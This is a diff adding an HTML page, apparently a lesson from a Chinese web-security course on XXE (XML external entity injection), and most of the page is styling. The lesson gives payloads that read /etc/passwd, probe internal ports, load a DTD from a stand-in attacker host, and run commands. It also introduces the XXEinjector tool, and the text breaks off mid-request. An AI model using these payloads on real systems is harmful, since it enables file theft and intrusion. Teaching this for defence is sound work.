@@ -1,0 +1,1002 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>11 | XXE 漏洞：XML 解析器的坑</title>
+<style type="text/css">
+:root {
+    --control-text-color: #777;
+    --select-text-bg-color: rgba(223, 197, 223);  /*#7e66992e;*/
+    
+    /* side bar */
+    --side-bar-bg-color: rgb(255, 255, 255);
+    --active-file-text-color: #8163bd;
+    --active-file-bg-color: #E9E4F0;
+    --item-hover-bg-color: #E9E4F0;
+    --active-file-border-color: #8163bd;
+
+    --title-color: #6c549c;
+    --font-sans-serif: 'Ubuntu', 'Source Sans Pro', sans-serif !important;
+    --font-monospace: 'Fira Code', 'Roboto Mono', monospace !important;
+    --purple-1: #8163bd;
+    --purple-2: #79589F;
+    --purple-3: #fd5eb8;
+    --purple-light-1: rgba(99, 99, 172, .05);
+    --purple-light-2: rgba(99, 99, 172, .1);
+    --purple-light-3: rgba(99, 99, 172, .2);
+    --purple-light-4: rgba(129, 99, 189, .3);
+    --purple-light-5: #E9E4F0;
+    --purple-light-6: rgba(129, 99, 189, .8);
+}
+
+/* html {
+    font-size: 16px;
+} */
+
+body {
+    font-family: var(--font-sans-serif);
+    color: #34495e;
+    -webkit-font-smoothing: antialiased;
+    line-height: 1.6rem;
+    letter-spacing: 0;
+    margin: 0;
+    overflow-x: hidden;
+}
+
+/* 页边距 和 页面大小 */
+#write {
+    padding-left: 6ch;
+    padding-right: 6ch;
+    margin: 0 auto;
+}
+
+#write p {
+    line-height: 1.6rem;
+    word-spacing: .05rem;
+}
+
+#write ol li {
+    padding-left: 0.5rem;
+}
+
+#write > ul:first-child,
+#write > ol:first-child {
+    margin-top: 30px;
+}
+
+body > *:first-child {
+    margin-top: 0 !important;
+}
+
+body > *:last-child {
+    margin-bottom: 0 !important;
+}
+
+a {
+    color: var(--purple-1);
+    padding: 0 2px;
+    text-decoration: none;
+}
+.md-content {
+    color: var(--purple-light-6);
+}
+#write a {
+    border-bottom: 1px solid var(--purple-1);
+    color: var(--purple-1);
+    text-decoration: none;
+}
+
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+    position: relative;
+    margin-top: 1rem;
+    margin-bottom: 0.5rem;
+    /* font-weight: bold; */
+    font-weight: 500 !important;
+    line-height: 1.4;
+    cursor: text;
+    color: var(--title-color);
+    font-family: var(--font-sans-serif);
+}
+
+h1:hover a.anchor,
+h2:hover a.anchor,
+h3:hover a.anchor,
+h4:hover a.anchor,
+h5:hover a.anchor,
+h6:hover a.anchor {
+    text-decoration: none;
+}
+
+h1 tt,
+h1 code {
+    font-size: inherit !important;
+}
+h2 tt,
+h2 code {
+    font-size: inherit !important;
+}
+h3 tt,
+h3 code {
+    font-size: inherit !important;
+}
+h4 tt,
+h4 code {
+    font-size: inherit !important;
+}
+h5 tt,
+h5 code {
+    font-size: inherit !important;
+}
+h6 tt,
+h6 code {
+    font-size: inherit !important;
+}
+
+
+h1 {
+    padding-bottom: .4rem;
+    font-size: 2.2rem;
+    line-height: 1.3;
+}
+h1 {
+    text-align: center;
+    padding-bottom: 0.3em;
+    font-size: 2.2em;
+    line-height: 1.2;
+    margin: 2.4em auto 1.2em;
+}
+h1:after {
+    content: '';
+    display: block;
+    margin: 0.2em auto 0;
+    width: 100px;
+    height: 2px;
+    border-bottom: 2px solid var(--title-color);
+}
+
+h2 {
+    margin: 1.6em auto 0.5em;
+    padding-left: 10px;
+    line-height: 1.4;
+    font-size: 1.8em;
+    border-left: 9px solid var(--title-color);
+    border-bottom: 1px solid var(--title-color);
+}
+h3 {
+    font-size: 1.5rem;
+    margin: 1.2em auto 0.5em;
+}
+h4 {
+    font-size: 1.3rem;
+}
+h5 {
+    font-size: 1.2rem;
+}
+h6 {
+    font-size: 1.1rem;
+}
+
+p,
+blockquote,
+ul,
+ol,
+dl,
+table {
+    margin: 0.8em 0;
+}
+
+li > ol,
+li > ul {
+    margin: 0 0;
+}
+
+hr {
+    height: 2px;
+    padding: 0;
+    margin: 16px 0;
+    background-color: #e7e7e7;
+    border: 0 none;
+    overflow: hidden;
+    box-sizing: content-box;
+}
+
+body > h2:first-child {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+body > h1:first-child {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+body > h1:first-child + h2 {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+body > h3:first-child,
+body > h4:first-child,
+body > h5:first-child,
+body > h6:first-child {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+a:first-child h1,
+a:first-child h2,
+a:first-child h3,
+a:first-child h4,
+a:first-child h5,
+a:first-child h6 {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+h1 p,
+h2 p,
+h3 p,
+h4 p,
+h5 p,
+h6 p {
+    margin-top: 0;
+}
+
+li p.first {
+    display: inline-block;
+}
+
+ul,
+ol {
+    padding-left: 30px;
+}
+
+ul:first-child,
+ol:first-child {
+    margin-top: 0;
+}
+
+ul:last-child,
+ol:last-child {
+    margin-bottom: 0;
+}
+
+/* 引用 */
+blockquote {
+    /* margin-left: 1rem; */
+    border-left: 4px solid var(--purple-light-4);
+    padding: 10px 15px;
+    color: #777;
+    background-color: var(--purple-light-1);
+}
+
+/* 表格 */
+table {
+    padding: 0;
+    word-break: initial;
+}
+
+table tr {
+    border-top: 1px solid #dfe2e5;
+    margin: 0;
+    padding: 0;
+}
+
+/* 表格 背景色 */
+table tr:nth-child(2n),
+thead {
+    background-color: var(--purple-light-1);
+}
+#write table thead th {
+    background-color: var(--purple-light-2);
+}
+
+table tr th {
+    font-weight: bold;
+    border: 1px solid #dfe2e5;
+    border-bottom: 0;
+    text-align: left;
+    margin: 0;
+    padding: 6px 13px;
+}
+
+table tr td {
+    border: 1px solid #dfe2e5;
+    text-align: left;
+    margin: 0;
+    padding: 6px 13px;
+}
+
+table tr th:first-child,
+table tr td:first-child {
+    margin-top: 0;
+}
+
+table tr th:last-child,
+table tr td:last-child {
+    margin-bottom: 0;
+}
+
+/* 粗体 */
+#write strong {
+    padding: 0 2px;
+    color: var(--purple-1);
+}
+
+/* 斜体 */
+#write em {
+    padding: 0 5px 0 2px;
+    /* font-style: normal; */
+    color: #42b983;
+}
+
+/* inline code */
+#write code, tt {
+    padding: 2px 4px;
+    border-radius: 2px;
+    font-family: var(--font-monospace);
+    font-size: 0.92rem;
+    color: var(--purple-3); 
+    background-color: rgba(99, 99, 172, .05);
+}
+
+tt {
+    margin: 0 2px;
+}
+
+#write .md-footnote {
+    background-color: #f8f8f8;
+    color: var(--purple-3);
+}
+
+/* heighlight. */
+#write mark {
+    background-color: #fbd3ea;
+    border-radius: 2px;
+    padding: 2px 4px;
+    margin: 0 2px;
+}
+
+#write del {
+    padding: 1px 2px;
+}
+
+.md-task-list-item > input {
+    margin-left: -1.3em;
+}
+
+@media print {
+    html {
+        font-size: 0.9rem;
+    }
+
+    table,
+    pre {
+        page-break-inside: avoid;
+    }
+
+    pre {
+        word-wrap: break-word;
+    }
+}
+
+#write pre.md-meta-block {
+    padding: 1rem;
+    font-size: 85%;
+    line-height: 1.45;
+    background-color: #f7f7f7;
+    border: 0;
+    border-radius: 3px;
+    color: #777777;
+    margin-top: 0 !important;
+}
+
+.mathjax-block > .code-tooltip {
+    bottom: .375rem;
+}
+
+/* 图片 */
+.md-image > .md-meta {
+    border-radius: 3px;
+    font-family: var(--font-monospace);
+    padding: 2px 0 0 4px;
+    font-size: 0.9em;
+    color: inherit;
+}
+p .md-image:only-child{
+    width: auto;
+    text-align: left;
+    margin-left: 2rem;
+}
+.md-tag {
+    color: inherit;
+}
+/* 当 “![shadow-随便写]()”写时，会有阴影 */
+.md-image img[alt|='shadow'] {
+    /* box-shadow: 0 4px 24px -6px #ddd; */
+    box-shadow:var(--purple-light-2) 0px 10px 15px;
+}
+
+#write a.md-toc-inner {
+    line-height: 1.6;
+    white-space: pre-line;
+    border-bottom: none;
+    font-size: 0.9rem;
+}
+
+#typora-quick-open {
+    border: 1px solid #ddd;
+    background-color: #f8f8f8;
+}
+
+#typora-quick-open-item {
+    background-color: #FAFAFA;
+    border-color: #FEFEFE #e5e5e5 #e5e5e5 #eee;
+    border-style: solid;
+    border-width: 1px;
+}
+
+#md-notification:before {
+    top: 10px;
+}
+
+header,
+.context-menu,
+.megamenu-content,
+footer {
+    font-family: var(--font-sans-serif);
+}
+
+.file-node-content:hover .file-node-icon,
+.file-node-content:hover .file-node-open-state {
+    visibility: visible;
+}
+
+.md-lang {
+    color: #b4654d;
+}
+
+.html-for-mac .context-menu {
+    --item-hover-bg-color: #E6F0FE;
+}
+
+/* 代码框 */
+/* CodeMirror 3024 Day theme */
+
+/* 代码段 背景 */
+pre {
+    --select-text-bg-color: rgba(223, 197, 223) !important;
+    margin: .5em 0;
+    padding: 1em 1.4em;
+    border-radius: 8px;
+    background: #f6f8fa;
+    overflow-x: auto;
+    box-sizing: border-box;
+    font-size: 14px;
+}
+
+/* 边框 */
+.md-fences {
+    border: 1px solid #e7eaed;
+    border-radius: 3px;
+}
+
+.cm-s-inner {
+  padding: .25rem;
+  border-radius: .25rem;
+}
+
+.cm-s-inner.CodeMirror, .cm-s-inner .CodeMirror-gutters {
+  background-color: #f8f8f8 !important;
+  color: #3a3432 !important;
+  border: none;
+}
+
+.cm-s-inner .CodeMirror-gutters {
+  color: #6d8a88;
+}
+
+.cm-s-inner .CodeMirror-cursor {
+  border-left: solid thin #5c5855 !important;
+}
+
+.cm-s-inner .CodeMirror-linenumber {
+  color: #807d7c;
+}
+
+.cm-s-inner .CodeMirror-line::selection, .cm-s-inner .CodeMirror-line::-moz-selection,
+.cm-s-inner .CodeMirror-line > span::selection,
+.cm-s-inner .CodeMirror-line > span::-moz-selection,
+.cm-s-inner .CodeMirror-line > span > span::selection,
+.cm-s-inner .CodeMirror-line > span > span::-moz-selection {
+  background: var(--purple-light-2);
+}
+
+.cm-s-inner span.cm-comment {
+  color: #cdab53;
+}
+
+.cm-s-inner span.cm-string, .cm-s-inner span.cm-string-2 {
+  color: #f2b01d;
+}
+
+.cm-s-inner span.cm-number {
+  color: #a34e8f;
+}
+
+.cm-s-inner span.cm-variable {
+  color: #01a252;
+}
+
+.cm-s-inner span.cm-variable-2 {
+  color: #01a0e4;
+}
+
+.cm-s-inner span.cm-def {
+  /* color: #e8bbd0; */
+  color: #e2287f;
+}
+
+.cm-s-inner span.cm-operator {
+  color: #ff79c6;
+}
+
+.cm-s-inner span.cm-keyword {
+  color: #db2d20;
+}
+
+.cm-s-inner span.cm-atom {
+  color: #a34e8f;
+}
+
+.cm-s-inner span.cm-meta {
+  color: inherit;
+}
+
+.cm-s-inner span.cm-tag {
+  color: #db2d20;
+}
+
+.cm-s-inner span.cm-attribute {
+  color: #01a252;
+}
+
+.cm-s-inner span.cm-qualifier {
+  color: #388aa3;
+}
+
+.cm-s-inner span.cm-property {
+  color: #01a252;
+}
+
+.cm-s-inner span.cm-builtin {
+  color: #388aa3;
+}
+
+.cm-s-inner span.cm-variable-3, .cm-s-inner span.cm-type {
+  color: #ffb86c;
+}
+
+.cm-s-inner span.cm-bracket {
+  color: #3a3432;
+}
+
+.cm-s-inner span.cm-link {
+  color: #a34e8f;
+}
+
+.cm-s-inner span.cm-error {
+  background: #db2d20;
+  color: #5c5855;
+}
+
+/* .md-fences.md-focus .cm-s-inner .CodeMirror-activeline-background {
+  background: var(--purple-light-2);
+} */
+
+.cm-s-inner .CodeMirror-matchingbracket {
+  text-decoration: underline;
+  color: #a34e8f !important;
+}
+
+#fences-auto-suggest .active {
+  background: #ddd;
+}
+
+#write .code-tooltip {
+  bottom: initial;
+  top: calc(100% - 1px);
+  background: #f7f7f7;
+  border: 1px solid #ddd;
+  border-top: 0;
+}
+
+.auto-suggest-container {
+  border-color: #b4b4b4;
+}
+
+.auto-suggest-container .autoComplt-hint.active {
+  background: #b4b4b4;
+  color: inherit;
+}
+
+/* task list */
+#write .md-task-list-item > input {
+  -webkit-appearance: initial;
+  display: block;
+  position: absolute;
+  border: 1px solid #b4b4b4;
+  border-radius: .25rem;
+  margin-top: .1rem;
+  margin-left: -1.8rem;
+  height: 1.2rem;
+  width: 1.2rem;
+  transition: background 0.3s;
+}
+
+#write .md-task-list-item > input:focus {
+  outline: none;
+  box-shadow: none;
+}
+
+#write .md-task-list-item > input:hover {
+  background: #ddd;
+}
+
+#write .md-task-list-item > input[checked]::before {
+  content: '';
+  position: absolute;
+  top: 20%;
+  left: 50%;
+  height: 60%;
+  width: 2px;
+  transform: rotate(40deg);
+  background: #333;
+}
+
+#write .md-task-list-item > input[checked]::after {
+  content: '';
+  position: absolute;
+  top: 46%;
+  left: 25%;
+  height: 30%;
+  width: 2px;
+  transform: rotate(-40deg);
+  background: #333;
+}
+
+#write .md-task-list-item > p {
+  transition: color 0.3s, opacity 0.3s;
+}
+
+#write .md-task-list-item.task-list-done > p {
+  color: #b4b4b4;
+  text-decoration: line-through;
+}
+
+#write .md-task-list-item.task-list-done > p > .md-emoji {
+  opacity: .5;
+}
+
+#write .md-task-list-item.task-list-done > p > .md-link > a {
+  opacity: .6;
+}
+
+/* sidebar and outline */
+.pin-outline .outline-active {
+  color: var(--active-file-text-color); 
+}
+
+.file-list-item {
+    border-bottom: 1px solid;
+    border-color: var(--purple-light-5);
+}
+
+.file-list-item-summary {
+    font-weight: 400;
+}
+
+.file-list-item.active {
+    color: var(--active-file-text-color);
+    background-color: var(--purple-light-5);
+}
+
+.file-tree-node.active>.file-node-background {
+    background-color: var(--purple-light-5);
+    font-weight: 700;
+} 
+
+.file-tree-node.active>.file-node-content {
+    color: var(--active-file-text-color);
+    font-weight: 700;
+}
+
+.file-node-content {
+    color: #5e676d;
+}
+
+.sidebar-tabs {
+    border-bottom: none;
+}
+.sidebar-tab.active {
+    font-weight: 400;
+}
+
+.sidebar-content-content {
+    font-size: 0.9rem;
+}
+
+img {
+    max-width: 100%;
+}
+
+body {
+    background-color: rgb(237, 237, 237);
+}
+#content {
+    width: 836px;
+    padding: 50px;
+    background: #fff;
+    margin: 0 auto;
+}/*# sourceURL=/Users/young/Documents/Codes/Fun/lagou/public/purple.css*/</style><style type="text/css">.hljs{display:block;overflow-x:auto;padding:.5em;color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}/*# sourceURL=/Users/young/Documents/Codes/Fun/lagou/public/atom-one-light.min.css*/</style></head>
+<body>
+  <div id="content"><h1>11 | XXE 漏洞：XML 解析器的坑</h1><p data-nodeid="1029" class="">上一讲我们介绍了 SSRF 漏洞，一种专门针对服务端的请求伪造攻击，常被用于攻击内网。在里面我介绍了 Burp Collaborator 用于专门测试无回显漏洞的功能，在本讲的 XXE 漏洞测试中，我们依然可以使用，不知道你是否还记得怎么使用？</p>
+<p data-nodeid="1030">下面，我们就开始今天的课程，一场关于 XML 外部实体注入（XXE）漏洞的攻防之路。</p>
+<h3 data-nodeid="1031">XXE：XML 外部实体注入</h3>
+<p data-nodeid="1032">XXE（XML External Entity，XML 外部实体注入）正是当允许引用外部实体时，通过构造恶意内容，导致读取任意文件、执行系统命令、内网探测与攻击等危害的一类漏洞。</p>
+<blockquote data-nodeid="1033">
+<p data-nodeid="1034">是不是想到了上节课讲的 SSRF？没错，利用 XXE 可以造成 SSRF。</p>
+</blockquote>
+<p data-nodeid="1035">PHP 默认使用 libxml 来解析 XML，但是从 libxml 2.9.0 开始，它默认不再解析外部实体，导致 PHP 下的 XXE 漏洞已经逐渐消失，除非你指定 LIBLXML_NOENT 去开启外部实体解析，才会存在 XXE 漏洞。</p>
+<pre class="lang-php" data-nodeid="1036"><code data-language="php">simplexml_load_string($xml, <span class="hljs-string">'SimpleXMLElement'</span>, LIBXML_NOENT);
+</code></pre>
+<p data-nodeid="1037">本文也不打算再讲 PHP 环境下的 XXE 漏洞，Java 才是 XXE 漏洞最常见的语言，因此主要以 Java 为例做一些介绍。但在漏洞利用的实例演示上，我依然用 Pikachu 靶场的 XXE 题目（PHP），因为 XXE 在利用上与语言无关，无论是 php、java 还是 C、python，利用技巧都是一样的。</p>
+<h3 data-nodeid="1038">那么，什么是 XML？</h3>
+<p data-nodeid="1039">XML（Extensible Markup Language）意为可扩展性标记语言，我将介绍下 XML 的一些基础知识，方便你更好地理解漏洞原理。</p>
+<h4 data-nodeid="1040">1.XML 文档结构</h4>
+<p data-nodeid="1041">XML 文档结构包括 XML 声明、文档类型定义（DTD）、文档元素，具体可以参考以下示例。</p>
+<pre class="lang-xml" data-nodeid="1042"><code data-language="xml"><span class="hljs-comment">&lt;!--XML声明--&gt;</span>
+<span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span> 
+<span class="hljs-comment">&lt;!--文档类型定义--&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">people</span> [  &lt;!--定义此文档是 people 类型的文档--&gt;
+  <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">people</span> (<span class="hljs-meta-keyword">name</span>,<span class="hljs-meta-keyword">age</span>,<span class="hljs-meta-keyword">mail</span>)&gt;</span>  &lt;!--定义people元素有3个元素--&gt;
+  <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">name</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义name元素为“#PCDATA”类型--&gt;
+  <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">age</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义age元素为“#PCDATA”类型--&gt;
+  <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">mail</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义mail元素为“#PCDATA”类型--&gt;
+]]]&gt;</span>
+<span class="hljs-comment">&lt;!--文档元素--&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">people</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>john<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">mail</span>&gt;</span>john@qq.com<span class="hljs-tag">&lt;/<span class="hljs-name">mail</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">people</span>&gt;</span>
+</code></pre>
+<p data-nodeid="1043">三者其中，与 XXE 漏洞相关的主要在于文档类型定义（DTD），所以下面主要重点来介绍下 DTD。</p>
+<h4 data-nodeid="1044">2.DTD 实体声明</h4>
+<p data-nodeid="1045">DTD（Document Type Definition，文档类型定义）用于定义 XML 文档结构，包括元素的定义规则、元素间的关系规则、属性的定义规则，其定义结构如下：</p>
+<pre class="lang-xml" data-nodeid="1046"><code data-language="xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 [定义内容]&gt;</span>
+</code></pre>
+<p data-nodeid="1047">DTD 实体就是变量，它既可以在文档内部声明，也可以外部引用，供在 XML 文档里面去使用。</p>
+<ul data-nodeid="1048">
+<li data-nodeid="1049">
+<p data-nodeid="1050"><strong data-nodeid="1154">内部实体声明</strong></p>
+</li>
+</ul>
+<p data-nodeid="1051">内部声明采用如下格式定义：</p>
+<pre class="lang-xml" data-nodeid="1052"><code data-language="xml">  <span class="hljs-meta">&lt;!ENTITY 实体名 <span class="hljs-meta-string">"实体值"</span>&gt;</span>
+</code></pre>
+<p data-nodeid="1053">声明之后就可以通过“&amp;实体名;”来获取，示例如下：</p>
+<pre class="lang-xml" data-nodeid="1054"><code data-language="xml">  <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [
+    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">test</span> <span class="hljs-meta-string">"john"</span>&gt;</span>
+  ]&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">root</span>
+</span></code></pre>
+<ul data-nodeid="1055">
+<li data-nodeid="1056">
+<p data-nodeid="1057"><strong data-nodeid="1162">外部实体引用</strong></p>
+</li>
+</ul>
+<p data-nodeid="1058">XXE 的产生正是外部实体引用的结果，可分为普通实体和参数实体。</p>
+<p data-nodeid="1059"><strong data-nodeid="1168">（1）普通实体</strong>声明格式如下：</p>
+<pre class="lang-java" data-nodeid="1060"><code data-language="java">&lt;!ENTITY 实体名 SYSTEM <span class="hljs-string">"URI"</span>&gt;
+或者
+&lt;!ENTITY 实体名 PUBLIC <span class="hljs-string">"public_ID"</span> <span class="hljs-string">"URI"</span>&gt;
+</code></pre>
+<p data-nodeid="1061">举个例子：</p>
+<pre class="lang-java" data-nodeid="1062"><code data-language="java">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre>
+<p data-nodeid="1063">声明实体 xxe，用于读取 /etc/passwd 文件，然后通过 &amp;xxe; 来引用执行。</p>
+<p data-nodeid="1064"><strong data-nodeid="1177">（2）参数实体</strong>声明主要用于后续使用，与普通实体不同的是，它中间有百分号字符（%），其声明格式如下：</p>
+<pre class="lang-java" data-nodeid="1065"><code data-language="java">&lt;!ENTITY % 实体名称 <span class="hljs-string">"实体的值"</span>&gt;
+或者
+&lt;!ENTITY % 实体名称 SYSTEM <span class="hljs-string">"URI"</span>&gt;
+</code></pre>
+<p data-nodeid="1066">举个例子：</p>
+<pre class="lang-xml" data-nodeid="1067"><code data-language="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [
+  	<span class="hljs-meta">&lt;!ENTITY  % <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"http://hacker.com/evil.dtd"</span> &gt;</span>
+  	%xxe;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>
+  	<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;evil;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+</code></pre>
+<p data-nodeid="1068">xxe.dtd 内容如下：</p>
+<pre class="lang-xml" data-nodeid="1069"><code data-language="xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">evil</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"file:///etc/passwd"</span>&gt;</span>
+</code></pre>
+<p data-nodeid="1070">上面先声明 xxe 参数实体，引入外部实体 "http://hacker.com/evil.dtd"，里面声明了一个叫 evil 的实体，用于读取 /etc/passwd 文件，最后在通过 &amp;evil; 来引用执行。<br>
+在不同的语言中其支持协议还不一样，需要根据业务场景来实测，常见的协议有 file、http、ftp、https、except 等等。</p>
+<h3 data-nodeid="1071">危害：XXE 的常见攻击手段</h3>
+<p data-nodeid="1072">下面介绍一些 XXE 漏洞的常见利用方法，并提供一些 payload 测试用例，测试仍以 Pikachu XXE 题目作为演示。</p>
+<h4 data-nodeid="1073">1.内网攻击</h4>
+<p data-nodeid="1074">XXE 支持 http 等 URL，所以同样可以产生与 SSRF 一样效果，对内网进行指纹探测、端口扫描、漏洞攻击等行为。</p>
+<p data-nodeid="1075">比如以下的 payload：</p>
+<pre class="lang-xml" data-nodeid="1076"><code data-language="xml"><span class="hljs-meta">&lt;?xml version = "1.0"?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [
+    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"http://192.168.31.124:4444/test"</span>&gt;</span>
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">r</span>&gt;</span>
+</code></pre>
+<p data-nodeid="1077">由于不存在该端口，所以会出错误：</p>
+<p data-nodeid="1793" class=""><img src="https://s0.lgstatic.com/i/image/M00/8E/F5/CgqCHmAGWcqAO_PgAASscDOp6uA731.png" alt="图片1.png" data-nodeid="1797"></p>
+<div data-nodeid="1794"><p style="text-align:center">图 1  探测内网端口失败</p></div>
+
+
+
+
+<p data-nodeid="1080">成功的话，会返回空白，通过这种对比差异，可以判断是否利用成功：</p>
+<p data-nodeid="2812" class=""><img src="https://s0.lgstatic.com/i/image2/M01/06/D6/Cip5yGAGWdyAQDS2AANXkfuguok138.png" alt="图片2.png" data-nodeid="2816"></p>
+<div data-nodeid="2813"><p style="text-align:center">图 2  探测内网端口成功</p></div>
+
+
+
+
+<h4 data-nodeid="1083">2.读取本地文件</h4>
+<p data-nodeid="1084">通过 file:// 可以读取本地文件，造成敏感文件泄露：</p>
+<pre class="lang-xml" data-nodeid="1085"><code data-language="xml"><span class="hljs-meta">&lt;?xml version = "1.0"?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [
+    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"file:///etc/passwd"</span>&gt;</span>
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span>
+</code></pre>
+<p data-nodeid="1086">输入上述 XML 提交后，成功读取到 /etc/passwd 文件内容：</p>
+<p data-nodeid="1087"><img src="https://s0.lgstatic.com/i/image2/M01/05/7B/CgpVE2AABv6AfyHcAAGL6fVMVng679.png" alt="Drawing 2.png" data-nodeid="1207"></p>
+<div data-nodeid="1088"><p style="text-align:center">图 3  利用XXE漏洞读取 /etc/passwd</p></div>
+<h4 data-nodeid="1089">3.远程执行命令</h4>
+<p data-nodeid="1090">如果是 PHP 环境下并安装 except 扩展，就可以利用它执行系统命令了。这种情况现在已经比较少见了，更多还是要利用其他漏洞来实现命令或代码执行。</p>
+<pre class="lang-java" data-nodeid="1091"><code data-language="java">&lt;?xml version = "1.0"?&gt;
+&lt;!DOCTYPE ANY [
+    &lt;!ENTITY xxe SYSTEM "except://id"&gt;
+]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;
+</code></pre>
+<h3 data-nodeid="1092">XXE 漏洞利用工具</h3>
+<h4 data-nodeid="1093">1.XXEinjector</h4>
+<p data-nodeid="1094">推荐一款综合型的 XXE 漏洞利用工具<a href="https://github.com/enjoiz/XXEinjector" data-nodeid="1215">XXEinjector</a>，用 Ruby 开发，运行前需要先安装 ruby。</p>
+<pre class="lang-java" data-nodeid="1095"><code data-language="java">sudo apt install ruby
+</code></pre>
+<p data-nodeid="1096">通过输入请求包数据，并指定攻击行为，比如列目录、读文件等。</p>
+<pre class="lang-java" data-nodeid="1097"><code data-language="java">$ cat req.txt&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-number">1</span> ↵
+GET /mmpaymd/ordercallback HTTP/<span class="hljs-number">1.1</span>
+Host: <span class="hljs-number">100.95</span><span class="hljs-number">.204</span><span class="hljs-number">.69</span>:<span class="hljs-number">8081</span>
+Upgrade-Insecure-Requests: <span class="hljs-number">1</span>
+User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">65.0</span><span class="hljs-number">.3325</span><span class="hljs-number">.181</span> Safari/<span class="hljs-number">537.36</span>
+Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh,zh-CN;q=0.9,en;q=0.8
